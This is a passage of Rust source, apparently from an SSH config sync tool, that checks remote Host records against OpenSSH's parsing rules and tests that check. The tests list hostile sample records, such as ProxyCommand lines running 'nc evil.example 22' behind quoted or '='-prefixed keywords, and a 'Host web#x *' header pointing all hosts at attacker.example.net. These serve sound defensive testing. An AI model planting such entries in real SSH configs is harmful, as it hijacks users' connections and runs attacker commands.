/// `line`(`render_directive` 寫出的那一行 = 縮排 + keyword + 分隔符 + keyword 之後的文字)裡 OpenSSH 當成註解的部分從哪個
/// 位元組開始(`openssh_comment_start`)。沒有註解、整段原樣使用的 keyword(`RAW_LINE_KEYWORDS`)→ None。
fn openssh_comment_offset(d: &Directive, line: &str) -> Option<usize> {
    if RAW_LINE_KEYWORDS.contains(&d.key.as_str()) {
        return None;
    }
    let separator = match &d.separator {
        Separator::Space(s) | Separator::Equals(s) => s,
    };
    let start = d.indent.len() + d.keyword.len() + separator.len();
    openssh_comment_start(line.get(start..)?).map(|at| start + at)
}

/// 空行與整行註解:解析器以 `char::is_whitespace` 判斷「空白」,OpenSSH 只認空格與 tab(行尾另外去掉 CR、LF、form feed)
/// —— 縮排或整行是 U+00A0 之類的字元,對 OpenSSH 就不是空行或註解,而是一個不認得的 keyword(整份設定讀不進去)。
/// 註解本身(第一個 `#` 之後)ssh 不讀,不看;行尾的 CR 同 `has_invisible_character`。
fn invisible_outside_comment(line: &str) -> bool {
    let line = line.strip_suffix('\r').unwrap_or(line);
    line[..line.find('#').unwrap_or(line.len())].chars().any(is_invisible)
}

/// OpenSSH 讀設定值時從哪個位元組起是註解(`misc.c` 的 `argv_split`,`terminate_on_comment`):以空格與 tab 分詞,
/// 雙引號與單引號成對、`\'` `\"` `\\` 與引號外的 `\ ` 是跳脫;一個詞的**開頭**是 `#`(不在引號裡)才是註解的開始,
/// 黏在詞中間的 `#` 是詞的一部分。`text` = keyword 與分隔符之後的整段文字。沒有註解 → None;引號沒有收尾 → 也是
/// None(OpenSSH 會以 invalid quotes 拒絕整份設定,沒有哪一段是註解)。只比對 ASCII 位元組,多位元組的 UTF-8 字元
/// 不會被誤認。
fn openssh_comment_start(text: &str) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b' ' | b'\t' => i += 1,
            b'#' => return Some(i),
            _ => {
                let mut quote = None;
                while i < bytes.len() {
                    match (bytes[i], quote) {
                        (b'\\', _) if matches!(bytes.get(i + 1), Some(b'\'' | b'"' | b'\\')) => i += 1,
                        (b'\\', None) if bytes.get(i + 1) == Some(&b' ') => i += 1,
                        (b' ' | b'\t', None) => break,
                        (b'"' | b'\'', None) => quote = Some(bytes[i]),
                        (c, Some(q)) if c == q => quote = None,
                        _ => {}
                    }
                    i += 1;
                }
                if quote.is_some() {
                    return None;
                }
            }
        }
    }
    None
}

/// Host / Match 那一行 OpenSSH 讀到的 pattern 和解析器的一樣(`Forbidden::MisreadHeader`)。OpenSSH 先去掉行尾的空白
/// (空格、tab、CR、LF、form feed),keyword 之後的文字以 `argv_split` 分詞到註解為止;那一段不能有引號或反斜線(兩邊的
/// 處理不同),分出來的詞要和解析器的 pattern(`HostBlock::patterns` = header 的 value 以空白切開)完全相同。註解裡的
/// 字元不影響結果(`Host web # Frank's laptop` 照常可用)。
fn header_reads_the_same(header: &Directive) -> bool {
    let rest = format!("{}{}{}", header.value, header.trailing_ws, header.inline_comment.as_deref().unwrap_or(""));
    let rest = rest.trim_end_matches([' ', '\t', '\r', '\n', '\u{c}']);
    let read = &rest[..openssh_comment_start(rest).unwrap_or(rest.len())];
    !read.contains(['"', '\'', '\\'])
        && read.split([' ', '\t']).filter(|word| !word.is_empty()).eq(header.value.split_whitespace())
}

/// Host / Match header 在錯誤訊息裡的名稱;其他 keyword → None。解析器只在 keyword 恰好是 host / match 時才建 header。
fn header_name(key: &str) -> Option<&'static str> {
    match key {
        "host" => Some("Host"),
        "match" => Some("Match"),
        _ => None,
    }
}

/// 文字恰好是一個 Host 區塊,而且那一行 OpenSSH 讀到的 pattern 與解析器的相同。給 `approval::needs_approval` 用:那裡的
/// 簽章只描述解析器看到的 pattern,`Host web#x *` 這種行讓簽章看不出它其實套用到每一台主機,所以一律要核准。
pub(crate) fn is_single_host_block_read_alike(items: &[Item]) -> bool {
    matches!(items, [Item::Host(h)] if header_reads_the_same(&h.header))
}

fn forbidden(d: &Directive) -> Option<Forbidden> {
    if d.serializes_as_comment() {
        return None; // 會被序列化成註解的行不生效;判斷與序列化器共用 `Directive::serializes_as_comment`
    }
    if d.keyword.is_empty() {
        return Some(Forbidden::LeadingEquals); // 縮排之後第一個字元就是 `=`
    }
    if d.keyword.contains('"') {
        return Some(Forbidden::QuotedKeyword);
    }
    if d.key == "include" {
        return Some(Forbidden::Include);
    }
    if has_invisible_character(d) {
        return Some(Forbidden::InvisibleCharacter);
    }
    if has_stray_character(d) {
        return Some(Forbidden::StrayCharacter);
    }
    // 走到這裡 `d.key` 就是 OpenSSH 讀到的 keyword,值的規則才對得上。
    if let Some(name) = header_name(&d.key) {
        return (!header_reads_the_same(d)).then_some(Forbidden::MisreadHeader(name));
    }
    let name = SHELL_BOUND_KEYWORDS.iter().find(|(key, _)| d.key == *key).map(|(_, name)| *name)?;
    (!is_plain_shell_bound_value(d)).then_some(Forbidden::UnsafeValue(name))
}

/// 第一個不允許的 directive:top-level 與 Host/Match 區塊內都查,Host/Match 那一行本身也算(它同樣是會生效的一行:
/// 解析器只在 keyword 恰好是 host/match 時才建 header,所以 keyword 層的檢查不會有東西,但 `Host web<U+00A0>` 這種
/// 行要靠 `InvisibleCharacter` 擋,`Host web#x *` 這種 OpenSSH 讀到別的 pattern 的行要靠 `MisreadHeader` 擋);會被序列化
/// 成註解的 directive(`Directive::serializes_as_comment`)不算。空行與整行註解只看 OpenSSH 會讀的部分
/// (`invisible_outside_comment`)。`check_managed_items` 用它檢查整個同步檔,`validate_host_text` 檢查一筆記錄的區塊。
pub fn forbidden_directive(items: &[Item]) -> Option<Forbidden> {
    items.iter().find_map(|item| match item {
        Item::Directive(d) => forbidden(d),
        Item::Host(h) => forbidden(&h.header).or_else(|| forbidden_directive(&h.body)),
        Item::Match(m) => forbidden(&m.header).or_else(|| forbidden_directive(&m.body)),
        Item::Blank(line) | Item::Comment(line) => invisible_outside_comment(line).then_some(Forbidden::InvisibleCharacter),
    })
}

#[derive(Clone, Debug, PartialEq)]
pub struct HostBlockText {
    pub alias: String,
    /// 區塊原始文字,含 header 與 body 所有行(含 `#tags:` 與尾隨空行)。
    pub text: String,
}

fn block_text(item: &Item) -> String {
    serialize_items(std::slice::from_ref(item), true)
}

/// 只取可同步的 Host 區塊(`is_syncable_block`);alias = 第一個 pattern。註解、空行、Match 與
/// 含 wildcard 的區塊一律略過。
pub fn blocks_of(items: &[Item]) -> Vec<HostBlockText> {
    items
        .iter()
        .filter_map(|item| match item {
            Item::Host(h) if is_syncable_block(&h.patterns) => h
                .patterns
                .first()
                .map(|alias| HostBlockText { alias: alias.clone(), text: block_text(item) }),
            _ => None,
        })
        .collect()
}

/// 文字必須「只」含一個 Host 區塊:夾帶 Match、全域指令或區塊外註解都拒絕 —— 否則套用後檔案裡只剩
/// Host,快取卻是完整文字,下一輪會把截斷結果當成本機修改重新上傳。
fn parse_single_host(alias: &str, text: &str) -> Result<Item, AppError> {
    let (parsed, _) = parse_file(text);
    let mut hosts = Vec::new();
    for item in parsed {
        match item {
            Item::Host(_) => hosts.push(item),
            _ => return Err(AppError::Other(format!("synced record for '{alias}' must contain nothing but one Host block"))),
        }
    }
    if hosts.len() != 1 {
        return Err(AppError::Other(format!("synced record for '{alias}' must contain exactly one Host block")));
    }
    let host = hosts.remove(0);
    match &host {
        Item::Host(h) if h.patterns.first().map(String::as_str) != Some(alias) => {
            Err(AppError::Other(format!("synced record for '{alias}' names a different host")))
        }
        Item::Host(h) if !is_syncable_block(&h.patterns) => {
            Err(AppError::Other(format!("synced record for '{alias}' contains wildcard patterns")))
        }
        _ => match forbidden_directive(std::slice::from_ref(&host)) {
            Some(f) => Err(AppError::Other(format!(
                "synced record for '{alias}' contains {}, which synced hosts cannot use",
                f.describe()
            ))),
            None => Ok(host),
        },
    }
}

/// `apply_host_text` 對文字的全部要求,拆成純檢查:恰好一個 Host 區塊、第一個 pattern 等於 alias、
/// 所有 pattern 皆具名、沒有不允許的 directive(`forbidden_directive`)。A3 在合併前用它把壞掉的遠端記錄
/// 擋在快取外(否則套用失敗的記錄會在下一輪被當成本機刪除而產生 tombstone)。
pub fn validate_host_text(alias: &str, text: &str) -> Result<(), AppError> {
    if !is_syncable_alias(alias) {
        return Err(AppError::Other(format!("'{alias}' is a wildcard pattern; wildcard blocks are never synced")));
    }
    parse_single_host(alias, text).map(|_| ())
}

/// 以原始文字替換(或附加)一個具名 Host 區塊。回傳是否真的改了內容;wildcard alias、本地同名區塊
/// 含 wildcard、文字不合法都回 Err。
pub fn apply_host_text(items: &mut Vec<Item>, alias: &str, text: &str) -> Result<bool, AppError> {
    let pos = syncable_host_position(items, alias)?;
    let incoming = parse_single_host(alias, text)?;
    match pos {
        Some(p) => {
            if block_text(&items[p]) == block_text(&incoming) {
                return Ok(false);
            }
            items[p] = incoming;
            Ok(true)
        }
        None => {
            items.push(incoming);
            Ok(true)
        }
    }
}

/// 移除一個具名 Host 區塊;wildcard alias 或本地區塊含 wildcard 一律 false(tombstone 刪不到本地結構)。
pub fn remove_host_block(items: &mut Vec<Item>, alias: &str) -> bool {
    match syncable_host_position(items, alias) {
        Ok(Some(p)) => {
            items.remove(p);
            true
        }
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sync::files::check_managed_items;

    /// v1 留在主 config 的 Include 值(v1 的同步檔 `hosts.config`):升級之前主 config 裡我們唯一的 token。
    const INCLUDE_VALUE: &str = "~/.ssh/sshelter/hosts.config";

    /// 只有 v1 那一個 token 的清單(`ensure_include` 的輸入)。
    fn v1() -> Vec<String> {
        vec![INCLUDE_VALUE.to_string()]
    }

    const FILE: &str = "# synced by sshelter\n\nHost web-1\n  HostName 10.0.0.9\n  #tags: prod, web\n\nHost db-1\n  HostName 10.0.0.10\n";
    const WITH_WILDCARD: &str = "Host *\n  ServerAliveInterval 30\n\nHost web-1\n  HostName 10.0.0.9\n\nHost *.internal !bad.internal\n  User ops\n";

    #[test]
    fn managed_path_lives_under_ssh_dir() {
        let p = managed_path(Path::new("/home/f/.ssh"));
        assert_eq!(p, Path::new("/home/f/.ssh").join("sshelter").join("hosts.config"));
    }

    #[test]
    fn ensure_include_goes_to_the_very_top_and_is_idempotent() {
        // 前導註解/空行之後、既有 Include 與全域指令之前:同步檔必須是 ssh 第一個讀到的定義
        // (first-obtained-wins),spec §10 的「同步主機遮蔽本地同名主機」才成立。
        let (mut items, _) = parse_file("# main\n\nInclude ~/.ssh/other.config\nAddKeysToAgent yes\nHost a\n  HostName 1\n");
        assert!(ensure_include(&mut items, &v1()));
        assert!(!ensure_include(&mut items, &v1()));
        let text = serialize_items(&items, true);
        assert_eq!(
            text,
            format!("# main\n\nInclude {INCLUDE_VALUE}\nInclude ~/.ssh/other.config\nAddKeysToAgent yes\nHost a\n  HostName 1\n")
        );
        // 空檔:就是第一行。
        let (mut empty, _) = parse_file("");
        assert!(ensure_include(&mut empty, &v1()));
        assert_eq!(serialize_items(&empty, true), format!("Include {INCLUDE_VALUE}\n"));
    }

    #[test]
    fn ensure_include_moves_an_existing_include_to_the_top() {
        // 舊版插法(最後一個 Include 之後)或使用者搬動過:搬到最頂端,其他行原封不動。
        let (mut items, _) = parse_file("Include ~/.ssh/other.config\nInclude ~/.ssh/sshelter/hosts.config\nHost a\n");
        assert!(ensure_include(&mut items, &v1()));
        assert_eq!(serialize_items(&items, true), format!("Include {INCLUDE_VALUE}\nInclude ~/.ssh/other.config\nHost a\n"));
        assert!(!ensure_include(&mut items, &v1()));
        // 多路徑 Include:只抽走我們的 token,其他路徑留在原地。
        let (mut items, _) = parse_file("# c\nAddKeysToAgent yes\nInclude ~/.ssh/a.config ~/.ssh/sshelter/hosts.config\nHost a\n");
        assert!(ensure_include(&mut items, &v1()));
        assert_eq!(
            serialize_items(&items, true),
            format!("# c\nInclude {INCLUDE_VALUE}\nAddKeysToAgent yes\nInclude ~/.ssh/a.config\nHost a\n")
        );
        assert!(!ensure_include(&mut items, &v1()));
        // 已在首行、但排在別的路徑後面(`Include a ours`):ssh 會先讀 a,所以仍要正規化成獨立一行。
        let (mut items, _) = parse_file("Include ~/.ssh/a.config ~/.ssh/sshelter/hosts.config\nHost a\n");
        assert!(ensure_include(&mut items, &v1()));
        assert_eq!(serialize_items(&items, true), format!("Include {INCLUDE_VALUE}\nInclude ~/.ssh/a.config\nHost a\n"));
        assert!(!ensure_include(&mut items, &v1()));
    }

    const WORK: &str = "~/.ssh/sshelter/work-3fa2c1d9.config";
    const HOME: &str = "~/.ssh/sshelter/home-8b01e4aa.config";

    fn list(tokens: &[&str]) -> Vec<String> {
        tokens.iter().map(|t| t.to_string()).collect()
    }

    #[test]
    fn ensure_include_lists_every_selected_space_in_one_line_at_the_top() {
        let (mut items, _) = parse_file("# main\n\nInclude ~/.ssh/other.config\nHost a\n");
        assert!(ensure_include(&mut items, &list(&[WORK, HOME])));
        assert_eq!(
            serialize_items(&items, true),
            format!("# main\n\nInclude {WORK} {HOME}\nInclude ~/.ssh/other.config\nHost a\n")
        );
        assert!(!ensure_include(&mut items, &list(&[WORK, HOME])));
        // 清單或順序改了:整行換掉,位置不變。
        assert!(ensure_include(&mut items, &list(&[HOME])));
        assert_eq!(serialize_items(&items, true), format!("# main\n\nInclude {HOME}\nInclude ~/.ssh/other.config\nHost a\n"));
        assert!(ensure_include(&mut items, &list(&[WORK, HOME])));
        assert!(ensure_include(&mut items, &list(&[HOME, WORK])));
        assert_eq!(serialize_items(&items, true), format!("# main\n\nInclude {HOME} {WORK}\nInclude ~/.ssh/other.config\nHost a\n"));
    }

    /// SSHelter 的 agent Include(`agent::wiring`,金鑰保管庫 spec §6)是第一行:同步的 Include 排在它後面 —— 前導註解與空行之後、其他任何項目之前 ——
    /// 清單換了或清空也不動它;它在子目錄裡,不是同步的 token。
    #[test]
    fn ensure_include_goes_after_the_agent_include_and_leaves_it_alone() {
        let agent = "Include ~/.ssh/sshelter/agent/config";
        assert!(!is_our_include_token("~/.ssh/sshelter/agent/config"));
        let (mut items, _) = parse_file(&format!("{agent}\n# main\n\nAddKeysToAgent yes\nHost a\n  HostName 1\n"));
        assert!(ensure_include(&mut items, &list(&[WORK])));
        assert_eq!(serialize_items(&items, true), format!("{agent}\n# main\n\nInclude {WORK}\nAddKeysToAgent yes\nHost a\n  HostName 1\n"));
        assert!(!ensure_include(&mut items, &list(&[WORK])));
        // 清單換了:整行換掉,位置不變。
        assert!(ensure_include(&mut items, &list(&[HOME, WORK])));
        assert_eq!(
            serialize_items(&items, true),
            format!("{agent}\n# main\n\nInclude {HOME} {WORK}\nAddKeysToAgent yes\nHost a\n  HostName 1\n")
        );
        // 沒有勾選任何 space:只拿掉同步的那一行。
        assert!(ensure_include(&mut items, &[]));
        assert_eq!(serialize_items(&items, true), format!("{agent}\n# main\n\nAddKeysToAgent yes\nHost a\n  HostName 1\n"));
        assert!(!ensure_include(&mut items, &[]));
        // 只有 agent 的 Include 的檔案:同步的 Include 接在它後面。
        let (mut only, _) = parse_file(&format!("{agent}\n"));
        assert!(ensure_include(&mut only, &list(&[WORK])));
        assert_eq!(serialize_items(&only, true), format!("{agent}\nInclude {WORK}\n"));
        // 同一行還列著別的路徑:agent 的 token 仍算「它的」,同步的 Include 排在那一行之後(之後 `agent::wiring::ensure_include_first` 會把那一行拆開 —— 我們的單獨放最前面,
        // 使用者的路徑接在後面 —— 下一輪同步再把同步的 Include 排進它們之間)。
        let (mut shared, _) = parse_file(&format!("{agent} ~/.ssh/a.config\nHost a\n"));
        assert!(ensure_include(&mut shared, &list(&[WORK])));
        assert_eq!(serialize_items(&shared, true), format!("{agent} ~/.ssh/a.config\nInclude {WORK}\nHost a\n"));
    }

    #[test]
    fn ensure_include_replaces_the_v1_token_and_stale_globs_but_keeps_other_paths() {
        let text = "Include ~/.ssh/a.config ~/.ssh/sshelter/hosts.config\nAddKeysToAgent yes\nInclude ~/.ssh/sshelter/*.config # old\nHost a\n";
        let (mut items, _) = parse_file(text);
        assert!(ensure_include(&mut items, &list(&[WORK])));
        assert_eq!(
            serialize_items(&items, true),
            format!("Include {WORK}\nInclude ~/.ssh/a.config\nAddKeysToAgent yes\nHost a\n")
        );
        assert!(!ensure_include(&mut items, &list(&[WORK])));
        // 我們的 token 混在最頂端那一行也一樣:抽出來,別人的路徑留在原地(排在我們後面)。
        let (mut items, _) = parse_file(&format!("Include ~/.ssh/a.config {WORK}\nHost a\n"));
        assert!(ensure_include(&mut items, &list(&[WORK])));
        assert_eq!(serialize_items(&items, true), format!("Include {WORK}\nInclude ~/.ssh/a.config\nHost a\n"));
    }

    #[test]
    fn ensure_include_removes_the_line_when_no_space_is_selected() {
        let (mut items, _) = parse_file(&format!("# main\nInclude {WORK} {HOME}\nInclude ~/.ssh/a.config {WORK}\nHost a\n"));
        assert!(ensure_include(&mut items, &[]));
        assert_eq!(serialize_items(&items, true), "# main\nInclude ~/.ssh/a.config\nHost a\n");
        assert!(!ensure_include(&mut items, &[]));
        // 沒有我們的 Include 也沒有勾選:什麼都不動。
        let (mut plain, _) = parse_file("Host a\n");
        assert!(!ensure_include(&mut plain, &[]));
        assert_eq!(serialize_items(&plain, true), "Host a\n");
    }

    #[test]
    fn released_tokens_become_plain_includes_that_ensure_include_leaves_alone() {
        let local = "~/.ssh/sshelter-local/work-3fa2c1d9.config";
        let (mut items, _) = parse_file(&format!("# main\nInclude {WORK} ~/.ssh/a.config {HOME}\nHost a\n"));
        let kept = vec![(WORK.to_string(), local.to_string())];
        assert!(release_include(&mut items, &kept, |_| false));
        // 位置不變、別人的路徑留在原地;對照不到的我們的 token(檔案已經不在)拿掉。
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {local} ~/.ssh/a.config\nHost a\n"));
        assert!(!release_include(&mut items, &kept, |_| false), "nothing of ours is left");
        assert!(!is_our_include_token(local));
        // 之後建立或加入別的帳戶:我們的一行放在最頂端,本機那一行原封不動;沒有勾選任何 space 時也不碰它。
        assert!(ensure_include(&mut items, &list(&[HOME])));
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {HOME}\nInclude {local} ~/.ssh/a.config\nHost a\n"));
        assert!(ensure_include(&mut items, &[]));
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {local} ~/.ssh/a.config\nHost a\n"));
        // 整行只剩我們的 token、而且都對照不到:整行移除。
        let (mut only, _) = parse_file(&format!("Include {WORK}\nHost a\n"));
        assert!(release_include(&mut only, &[], |_| false));
        assert_eq!(serialize_items(&only, true), "Host a\n");
        // 生效中的一行改寫之後仍是生效的一行,不會變成註解(同 `ensure_include`)。
        let (mut live, _) = parse_file(&format!("Include {WORK}\nHost a\n"));
        if let Item::Directive(d) = &mut live[0] {
            d.enabled = false;
        }
        assert!(release_include(&mut live, &kept, |_| false));
        assert_eq!(serialize_items(&live, true), format!("Include {local}\nHost a\n"));
    }

    #[test]
    fn a_token_that_was_not_moved_stays_listed_while_its_file_is_still_there() {
        let local = "~/.ssh/sshelter-local/work-3fa2c1d9.config";
        let kept = vec![(WORK.to_string(), local.to_string())];
        // HOME 沒有搬(例如離開的同時同步輪次剛把它改了名、搬的是舊名稱),檔案卻還在:原樣留著,ssh 照樣讀得到;只有搬走的那個
        // 換成新路徑。
        let (mut items, _) = parse_file(&format!("# main\nInclude {WORK} ~/.ssh/a.config {HOME}\nHost a\n"));
        assert!(release_include(&mut items, &kept, |t| t == HOME));
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude {local} ~/.ssh/a.config {HOME}\nHost a\n"));
        // 什麼都沒搬、檔案都還在:那一行不動,也不算改了(呼叫端不必寫檔)。
        let (mut untouched, _) = parse_file(&format!("Include {HOME}\nHost a\n"));
        assert!(!release_include(&mut untouched, &[], |_| true));
        assert_eq!(serialize_items(&untouched, true), format!("Include {HOME}\nHost a\n"));
    }

    #[test]
    fn moved_files_that_only_a_glob_listed_get_their_new_path_where_the_glob_was() {
        let local = "~/.ssh/sshelter-local/work-3fa2c1d9.config";
        let kept = vec![(WORK.to_string(), local.to_string())];
        let glob = "~/.ssh/sshelter/*.config";
        // 只有 glob 讀它:新路徑放在 glob 前面;glob 還對得到檔案就留著,對不到就拿掉。
        let (mut items, _) = parse_file(&format!("# main\nInclude ~/.ssh/a.config {glob}\nHost a\n"));
        assert!(lists_include(&items, WORK) && !lists_include(&items, "~/.ssh/sshelter/sub/x.config"));
        assert!(release_include(&mut items, &kept, |_| true));
        assert_eq!(serialize_items(&items, true), format!("# main\nInclude ~/.ssh/a.config {local} {glob}\nHost a\n"));
        let (mut items, _) = parse_file(&format!("Include {glob}\nHost a\n"));
        assert!(release_include(&mut items, &kept, |_| false));
        assert_eq!(serialize_items(&items, true), format!("Include {local}\nHost a\n"));
        // 也明確列著的:只在它自己的位置換一次,glob 不再重複放。
        let (mut items, _) = parse_file(&format!("Include {glob}\nInclude {WORK}\nHost a\n"));
        assert!(release_include(&mut items, &kept, |_| true));
        assert_eq!(serialize_items(&items, true), format!("Include {glob}\nInclude {local}\nHost a\n"));
        // glob 涵蓋不到的(`*` 不跨 `/`、不對到 `.` 開頭的名稱)不算。
        assert!(!lists_include(&parse_file("Include ~/.ssh/sshelter/*.config\n").0, "~/.ssh/sshelter/.hidden.config"));
        assert!(!lists_include(&parse_file("Host a\n  Include ~/.ssh/sshelter/*.config\n").0, WORK), "only top-level lines count");
    }

    #[test]
    fn our_include_tokens_are_the_config_paths_under_the_sshelter_directory() {
        assert!(is_our_include_token(INCLUDE_VALUE));
        assert!(is_our_include_token(WORK));
        assert!(is_our_include_token("~/.ssh/sshelter/*.config"));
        assert!(!is_our_include_token("~/.ssh/sshelter/notes.txt"));
        assert!(!is_our_include_token("~/.ssh/other.config"));
        assert!(!is_our_include_token("\"~/.ssh/sshelter/work-3fa2c1d9.config\""));
        // 只有 `~/.ssh/sshelter/` 這一層(spec §4.3):前綴之後再有路徑分隔字元的 —— 子目錄、`..`、反斜線 —— 是使用者自己的 Include,不是我們寫的,
        // 也不歸我們管;這一層的 glob(手寫的 `*.config`)還是我們的。
        for users in [
            "~/.ssh/sshelter/sub/mine.config",
            "~/.ssh/sshelter/../outside.config",
            "~/.ssh/sshelter/sub\\mine.config",
            "~/.ssh/sshelter/*/mine.config",
            "~/.ssh/sshelter/**/*.config",
            "~/.ssh/sshelter//mine.config",
        ] {
            assert!(!is_our_include_token(users), "{users}");
        }
        assert!(is_our_include_token("~/.ssh/sshelter/mine-?.config"));
        assert!(is_our_include_token("~/.ssh/sshelter/[a-f]*.config"));
        // 停用的 Include(序列化成註解)不算我們的,也不會被改動。
        let (mut items, _) = parse_file("Host a\n");
        let mut disabled = Directive::new("Include", WORK, "");
        disabled.enabled = false;
        items.insert(0, Item::Directive(disabled));
        assert!(!ensure_include(&mut items, &[]));
        // 只有 `enabled = false`、沒有 dirty:序列化器照 `raw` 寫出,在磁碟上仍是生效的一行 —— 算我們的;收掉我們的 token
        // 之後,留下別人路徑的那一行仍然生效,不會變成註解。
        let (mut items, _) = parse_file(&format!("Include ~/.ssh/a.config {WORK}\nHost a\n"));
        if let Item::Directive(d) = &mut items[0] {
            d.enabled = false;
        }
        assert!(ensure_include(&mut items, &[]));
        assert_eq!(serialize_items(&items, true), "Include ~/.ssh/a.config\nHost a\n");
    }

    #[test]
    fn a_users_include_below_the_sshelter_directory_is_never_stripped_or_released() {
        // 探針 S / S2:子目錄與 `..` 的 Include 是使用者自己的;`ensure_include` 與 `release_include` 都不動它(以前整行被當成我們的收走,主機從 ssh 消失)。
        for token in ["~/.ssh/sshelter/sub/mine.config", "~/.ssh/sshelter/../outside.config"] {
            let (mut items, _) = parse_file(&format!("# main\nInclude {token} {WORK}\nHost a\n"));
            assert!(ensure_include(&mut items, &list(&[HOME])));
            assert_eq!(serialize_items(&items, true), format!("# main\nInclude {HOME}\nInclude {token}\nHost a\n"), "{token}");
            assert!(!ensure_include(&mut items, &list(&[HOME])));
            assert!(ensure_include(&mut items, &[]));
            assert_eq!(serialize_items(&items, true), format!("# main\nInclude {token}\nHost a\n"), "{token}");
            // 離開帳戶:對照不到、而且 `exists` 說不在 —— 還是不碰(它不是我們的 token,「檔案不在就拿掉」只對我們的)。
            assert!(!release_include(&mut items, &[], |_| false));
            assert!(!lists_include(&items, token));
            assert_eq!(serialize_items(&items, true), format!("# main\nInclude {token}\nHost a\n"), "{token}");
        }
    }

    #[test]
    fn wildcard_blocks_are_neither_extracted_nor_touched() {
        let (mut items, _) = parse_file(WITH_WILDCARD);
        // 先綁定 blocks_of 的結果再借用,否則暫時 Vec 在敘述結束就釋放(E0716)。
        let blocks = blocks_of(&items);
        let aliases: Vec<&str> = blocks.iter().map(|b| b.alias.as_str()).collect();
        assert_eq!(aliases, vec!["web-1"]);
        // 遠端送來 wildcard alias 的記錄:拒絕、不套用。
        assert!(apply_host_text(&mut items, "*", "Host *\n  User root\n").is_err());
        assert!(apply_host_text(&mut items, "*.internal", "Host *.internal\n").is_err());
        // tombstone 也刪不到 wildcard 區塊。
        assert!(!remove_host_block(&mut items, "*"));
        assert!(!remove_host_block(&mut items, "*.internal"));
        assert_eq!(serialize_items(&items, true), WITH_WILDCARD);
        assert!(!is_syncable_alias("*"));
        assert!(!is_syncable_alias("web?"));
        assert!(!is_syncable_alias("!web"));
        assert!(!is_syncable_alias(""));
        assert!(is_syncable_alias("web-1"));
        // 混合 pattern(`Host web *.internal`、`Host web !prod`):第一個 pattern 具名也不算,整個區塊本地。
        assert!(!is_syncable_block(&["web".to_string(), "*.internal".to_string()]));
        assert!(!is_syncable_block(&["web".to_string(), "!prod".to_string()]));
        assert!(!is_syncable_block(&[]));
        assert!(is_syncable_block(&["web".to_string(), "web.example.com".to_string()]));
        const MIXED: &str = "Host web *.internal\n  User ops\n\nHost db\n  HostName 1\n";
        let (mut items, _) = parse_file(MIXED);
        let blocks = blocks_of(&items);
        assert_eq!(blocks.iter().map(|b| b.alias.as_str()).collect::<Vec<_>>(), vec!["db"]);
        // 遠端的 `web` 記錄不能替換、也不能在旁邊附加第二個 `Host web`;tombstone 也刪不到它。
        assert!(apply_host_text(&mut items, "web", "Host web\n  User root\n").is_err());
        assert!(!remove_host_block(&mut items, "web"));
        assert_eq!(serialize_items(&items, true), MIXED);
        // 遠端記錄的文字本身含 wildcard pattern:拒絕。
        assert!(validate_host_text("web", "Host web *.internal\n").is_err());
        assert!(validate_host_text("web", "Host web\n  User root\n").is_ok());
    }

    #[test]
    fn synced_records_may_not_contain_forbidden_directives() {
        for text in [
            "Host web\n  Include ~/.ssh/other.config\n",
            "Host web\n  include=/tmp/x.config\n",
            "Host web\n  INCLUDE /tmp/x.config\n",
            // 分隔符、行尾與大小寫的各種寫法:OpenSSH 一律當成 Include。
            "Host web\n  Include\t/tmp/x.config\n",
            "Host web\r\n  Include /tmp/x.config\r\n",
            "Host web\n  Include = /tmp/x.config\n",
            "Host web\n  iNcLuDe /tmp/x.config\n",
            "Host web\n  Include=/tmp/x.config\n",
            "Host web\n  \"ProxyCommand\" nc evil.example 22\n",
            "Host web\n  Proxy\"Command\"nc evil.example 22\n",
            "Host web\n  \"Host\" evil\n  ProxyCommand nc evil.example 22\n",
            // 行首的 `=`:OpenSSH 略過它、把下一個詞當成 keyword;解析器的 keyword 卻是空字串。
            "Host web\n  =Include /tmp/x.config\n",
            "Host web\n  = Include /tmp/x.config\n",
            "Host web\n\t=ProxyCommand nc evil.example 22\n",
            "Host web\n  =Match all\n  ProxyCommand nc evil.example 22\n",
            "Host web\n  =Host *\n  ProxyCommand nc evil.example 22\n",
            "Host web\n  =\"Include\" /tmp/x.config\n",
            // Host 那一行 OpenSSH 讀到的 pattern 與解析器不同:解析器只看到 `web`,OpenSSH 讀到 `web#x` 與 `*`。
            "Host web#x *\n  HostName attacker.example.net\n  User root\n",
        ] {
            // 確認是被「不允許的 directive」檢查擋下的,而不是碰巧因為別的原因(例如多出一個區塊)被拒。
            let error = validate_host_text("web", text).expect_err(text).to_string();
            assert!(error.contains("cannot use"), "{text}: {error}");
            let (mut items, _) = parse_file("Host db\n");
            assert!(apply_host_text(&mut items, "web", text).is_err(), "{text}");
        }
        // 註解掉的 Include、值裡的 include 字樣與引號都可以。
        for text in [
            "Host web\n  # Include ~/.ssh/other.config\n",
            "Host web\n  ProxyJump include\n",
            "Host web\n  ProxyCommand sh -c \"nc %h %p\"\n",
        ] {
            assert!(validate_host_text("web", text).is_ok(), "{text}");
        }
    }

    #[test]
    fn forbidden_directives_are_found_anywhere_in_a_file() {
        assert_eq!(forbidden_directive(&parse_file("Include a.config\nHost web\n").0), Some(Forbidden::Include));
        assert_eq!(
            forbidden_directive(&parse_file("Host web\n  User a\nMatch all\n  Include b.config\n").0),
            Some(Forbidden::Include)
        );
        assert_eq!(forbidden_directive(&parse_file("Host web\n  \"User\" a\n").0), Some(Forbidden::QuotedKeyword));
        // 行首的 `=`(解析器的 keyword 是空字串):top-level、Host 區塊內、Match 區塊內都要抓到,不論後面是什麼 keyword。
        assert_eq!(forbidden_directive(&parse_file("=Include x\nHost web\n").0), Some(Forbidden::LeadingEquals));
        assert_eq!(
            forbidden_directive(&parse_file("Host web\n  User a\nMatch all\n  =Include x\n").0),
            Some(Forbidden::LeadingEquals)
        );
        assert_eq!(forbidden_directive(&parse_file("Host web\n  = ProxyCommand nc evil 22\n").0), Some(Forbidden::LeadingEquals));
        assert_eq!(forbidden_directive(&parse_file("Host web\n  =\"Include\" x\n").0), Some(Forbidden::LeadingEquals));
        // `=` 在 keyword 之後(`Keyword=value`、`Keyword = value`、值裡的 `=`)是正常寫法,不能誤擋。
        assert_eq!(forbidden_directive(&parse_file("Host web\n  User=bob\n  Port = 22\n  SetEnv A=b\n").0), None);
